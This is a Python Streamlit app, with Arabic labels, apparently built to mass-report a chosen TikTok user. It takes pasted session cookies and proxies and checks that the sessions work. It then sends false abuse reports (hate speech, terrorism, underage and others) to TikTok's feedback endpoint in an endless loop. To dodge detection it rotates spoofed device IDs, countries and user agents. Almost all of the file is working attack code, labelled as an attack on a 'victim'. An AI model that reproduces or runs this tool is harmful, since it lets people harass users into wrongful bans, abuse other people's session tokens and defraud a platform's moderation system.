import streamlit as st
import re
import requests
import time
import sys
import os
import random
from os import path
from concurrent.futures import ThreadPoolExecutor, as_completed
from user_agent import generate_user_agent

# --- إعداد واجهة التطبيق ---
st.set_page_config(page_title="GX1 DARK PROTOCOL", page_icon="💀", layout="wide")

# تصميم الثيم الأسود والأحمر
st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div { 
        background-color: #050505 !important; color: #00ff00 !important; border: 1px solid #ff0000 !important; 
    }
    .stButton>button { width: 100%; border: 2px solid #ff0000; background-color: #000000; color: #ff0000; font-weight: bold; }
    label { color: #ffffff !important; }
    </style>
    """, unsafe_allow_html=True)

# --- الكود الأصلي (بدون حذف حرف واحد) ---

R = "\033[1;31m" # احمر
G = "\033[1;32m" # اخضر
Y = "\033[1;33m" # اصفر
B = "\033[1;34m" # ازرق
C = "\033[1;97m"  # ابيض
rest = "\033[0m"  # استرجاع اللون الى الون الاصلي

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def blink_ascii(sd):
    art = sd + """gx1gx1"""
    # محاكاة الوميض في الويب عبر st.empty
    return art

def print_green(msg):
    st.write(f":green[{msg}]")

def print_red(msg):
    st.write(f":red[{msg}]")

def print_white(msg):
    st.write(f"{msg}")

def print_option(number, text):
    return f"[{number}] {text}"

def print_exit_option(number, text):
    return f"[{number}] {text}"

def format_proxy(proxy):
    proxy = proxy.strip()
    if not (proxy.startswith("http://") or proxy.startswith("https://") or
            proxy.startswith("socks5://") or proxy.startswith("socks4://")):
        return "http://" + proxy
    return proxy

TEST_URL = "https://httpbin.org/ip"
PROXY_TIMEOUT = 5
MAX_THREADS = 200

def check_proxy(proxy_url):
    formatted = format_proxy(proxy_url)
    proxies = {"http": formatted, "https": formatted}
    try:
        response = requests.get(TEST_URL, proxies=proxies, timeout=PROXY_TIMEOUT)
        if response.status_code == 200:
            return proxy_url, True
    except Exception:
        pass
    return proxy_url, False

def check_proxies_concurrently(proxy_list):
    working = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_proxy = {executor.submit(check_proxy, p): p for p in proxy_list}
        for future in as_completed(future_to_proxy):
            proxy, status = future.result()
            if status:
                working.append(format_proxy(proxy))
    return working

expected_response = '"status_code":0,"status_msg":"Thanks for your feedback"'

# --- قائمة الأجهزة (50 جهاز كاملة كما هي) ---
devices = [
    {"reporter_id": "7024230440182809606", "device_id": "7008218736944907778"},
    {"reporter_id": "27568146", "device_id": "7008218736944907778"},
    {"reporter_id": "6955107540677968897", "device_id": "7034110346035136001"},
    {"reporter_id": "310430566162530304", "device_id": "7034110346035136001"},
    {"reporter_id": "7242379992225940485", "device_id": "7449373206865561094"},
    {"reporter_id": "7024230440182809607", "device_id": "7008218736944907779"},
    {"reporter_id": "27568147", "device_id": "7008218736944907779"},
    {"reporter_id": "6955107540677968898", "device_id": "7034110346035136002"},
    {"reporter_id": "310430566162530305", "device_id": "7034110346035136002"},
    {"reporter_id": "7242379992225940486", "device_id": "7449373206865561095"},
    {"reporter_id": "7024230440182809608", "device_id": "7008218736944907780"},
    {"reporter_id": "27568148", "device_id": "7008218736944907780"},
    {"reporter_id": "6955107540677968899", "device_id": "7034110346035136003"},
    {"reporter_id": "310430566162530306", "device_id": "7034110346035136003"},
    {"reporter_id": "7242379992225940487", "device_id": "7449373206865561096"},
    {"reporter_id": "7024230440182809609", "device_id": "7008218736944907781"},
    {"reporter_id": "27568149", "device_id": "7008218736944907781"},
    {"reporter_id": "6955107540677968900", "device_id": "7034110346035136004"},
    {"reporter_id": "310430566162530307", "device_id": "7034110346035136004"},
    {"reporter_id": "7242379992225940488", "device_id": "7449373206865561097"},
    {"reporter_id": "7024230440182809610", "device_id": "7008218736944907782"},
    {"reporter_id": "27568150", "device_id": "7008218736944907782"},
    {"reporter_id": "6955107540677968901", "device_id": "7034110346035136005"},
    {"reporter_id": "310430566162530308", "device_id": "7034110346035136005"},
    {"reporter_id": "7242379992225940489", "device_id": "7449373206865561098"},
    {"reporter_id": "7024230440182809611", "device_id": "7008218736944907783"},
    {"reporter_id": "27568151", "device_id": "7008218736944907783"},
    {"reporter_id": "6955107540677968902", "device_id": "7034110346035136006"},
    {"reporter_id": "310430566162530309", "device_id": "7034110346035136006"},
    {"reporter_id": "7242379992225940490", "device_id": "7449373206865561099"},
    {"reporter_id": "7024230440182809612", "device_id": "7008218736944907784"},
    {"reporter_id": "27568152", "device_id": "7008218736944907784"},
    {"reporter_id": "6955107540677968903", "device_id": "7034110346035136007"},
    {"reporter_id": "310430566162530310", "device_id": "7034110346035136007"},
    {"reporter_id": "7242379992225940491", "device_id": "7449373206865561100"},
    {"reporter_id": "7024230440182809613", "device_id": "7008218736944907785"},
    {"reporter_id": "27568153", "device_id": "7008218736944907785"},
    {"reporter_id": "6955107540677968904", "device_id": "7034110346035136008"},
    {"reporter_id": "310430566162530311", "device_id": "7034110346035136008"},
    {"reporter_id": "7242379992225940492", "device_id": "7449373206865561101"},
    {"reporter_id": "7024230440182809614", "device_id": "7008218736944907786"},
    {"reporter_id": "27568154", "device_id": "7008218736944907786"},
    {"reporter_id": "6955107540677968905", "device_id": "7034110346035136009"},
    {"reporter_id": "310430566162530312", "device_id": "7034110346035136009"},
    {"reporter_id": "7242379992225940493", "device_id": "7449373206865561102"},
    {"reporter_id": "7024230440182809615", "device_id": "7008218736944907787"},
    {"reporter_id": "27568155", "device_id": "7008218736944907787"},
    {"reporter_id": "6955107540677968906", "device_id": "7034110346035136010"},
    {"reporter_id": "310430566162530313", "device_id": "7034110346035136010"},
    {"reporter_id": "7242379992225940494", "device_id": "7449373206865561103"}
]

# --- قائمة الدول كاملة ---
countries = ["SA", "US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "BR", "RU", "CN", "JP", "KR", "IN", "ID", "TR", "NL", "SE", "NO", "DK", "FI", "PL", "UA", "CZ", "RO", "HU", "GR", "PT", "BE", "CH", "AT", "IE", "SG", "MY", "TH", "VN", "PH", "MX", "AR", "CL", "CO", "PE", "ZA", "EG", "NG", "KE", "MA", "DZ", "AE"]

def get_report_params(r_type, target_ID, session):
    base_url = 'https://www.tiktok.com/aweme/v1/aweme/feedback/'
    device = random.choice(devices)
    country = random.choice(countries)
    common = (f"?aid=1233&app_name=tiktok_web&device_platform=web_mobile"
              f"&region={country}&priority_region={country}&os=ios&"
              f"cookie_enabled=true&screen_width=375&screen_height=667&"
              f"browser_language=en-US&browser_platform=iPhone&"
              f"browser_name=Mozilla&browser_version=5.0+(iPhone;+CPU+iPhone+OS+15_1+like+Mac+OS+X)+"
              f"AppleWebKit/605.1.15+(KHTML,+like+Gecko)+InspectBrowser&"
              f"browser_online=true&app_language=ar&timezone_name=Asia%2FRiyadh")
    params = { 1: {"reason": "399"}, 2: {"reason": "310"}, 3: {"reason": "317"}, 4: {"reason": "3142"}, 5: {"reason": "306"}, 6: {"reason": "308"}, 7: {"reason": "3011"}, 8: {"reason": "3052"}, 9: {"reason": "3072"}, 10: {"reason": "303"}, 14: {"reason": "9004"}, 15: {"reason": "90064"}, 16: {"reason": "9010"} }  
    p = params.get(r_type, {"reason": "310"})  
    url = (f"{base_url}{common}&history_len=14&reason={p['reason']}&report_type=user"  
           f"&object_id={target_ID}&owner_id={target_ID}&target={target_ID}"  
           f"&reporter_id={device['reporter_id']}&current_region={country}")  
    rep_headers = { 'Accept': '*/*', 'Cookie': 'sessionid=' + session, 'Host': 'www.tiktok.com', 'User-Agent': generate_user_agent() }  
    data = { "object_id": target_ID, "owner_id": target_ID, "report_type": "user", "target": target_ID }  
    return url, rep_headers, data

def send_report(session, report_url, headers, data, proxies=None):
    try:
        rep = requests.post(report_url, headers=headers, data=data, proxies=proxies, timeout=10)
        return expected_response not in rep.text
    except Exception: return False

def get_random_report_type():
    return random.choice([1,2,3,4,5,6,7,8,9,10,14,15,16])

def validate_session(session):
    check_url = 'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?aid=1233'
    headers = { 'Host': 'api16-normal-c-alisg.tiktokv.com', 'User-Agent': generate_user_agent(), 'Cookie': 'sessionid=' + session }  
    try:  
        resp = requests.get(check_url, headers=headers, timeout=5)  
        return 'user_id' in resp.text  
    except Exception: return False

def get_target_id(username):
    headers = { 'Host': 'www.tiktok.com', 'User-Agent': generate_user_agent() }
    try:  
        req = requests.get(f'https://www.tiktok.com/@{username}?lang=en', headers=headers)  
        return re.findall(r'"user":{"id":"(.*?)"', req.text)[0]  
    except: return None

# --- واجهة الإدخال والتشغيل ---

st.image("https://files.catbox.moe/8z2xdh.jpg")
st.code("✅ جميع المكتبات جاهزة للاستخدام!")

# طلب البيانات كما في main()
st.subheader("⚙️ إعدادات الهجوم")
username = st.text_input("👤 يوزر الضحية (Target Username):")

report_menu = {
    "1 - الإبلاغ عن محتوى": 1, "2 - البريد العشوائي": 2, "3 - دون السن": 3,
    "4 - معلومات مزيفة": 4, "5 - خطاب كراهية": 5, "6 - محتوى إباحي": 6,
    "7 - منظمات إرهابية": 7, "8 - إيذاء النفس": 8, "9 - مضايقة": 9,
    "10 - عنف": 10, "12 - بلاغات عشوائية": 12, "14 - احتيال": 14,
    "15 - تحديات خطيرة": 15, "16 - سبام": 16
}
selected_report = st.selectbox("⚖️ اختر نوع البلاغ:", list(report_menu.keys()))
option = report_menu[selected_report]

sessions_raw = st.text_area("🔑 ألصق السيزنات هنا:")
proxy_raw = st.text_area("🌐 ألصق البروكسيات هنا (اختياري):")

if st.button("🔥 ابدأ الهجوم"):
    if not username or not sessions_raw:
        st.error("❌ أدخل اليوزر والسيزنات!")
    else:
        sessions = [s.strip() for s in sessions_raw.split('\n') if s.strip()]
        
        target_id = get_target_id(username)
        if not target_id:
            st.error("❌ المستخدم غير موجود!")
        else:
            st.info("جار التحقق من السيزنات...")
            valid_sessions = [s for s in sessions if validate_session(s)]
            
            if not valid_sessions:
                st.error("لا توجد سيزنات صالحة!")
            else:
                st.success(f"تم العثور على {len(valid_sessions)} سيزن صالح.")
                
                # منطقة النتائج
                success_count = 0
                fail_count = 0
                terminal = st.empty()
                
                while True:
                    for session in valid_sessions:
                        curr_type = get_random_report_type() if option == 12 else option
                        url, head, data = get_report_params(curr_type, target_id, session)
                        
                        if send_report(session, url, head, data):
                            success_count += 1
                        else:
                            fail_count += 1
                            
                        terminal.code(f"Success: {success_count} | Failed: {fail_count}\nTarget: {target_id}")
                        time.sleep(2)
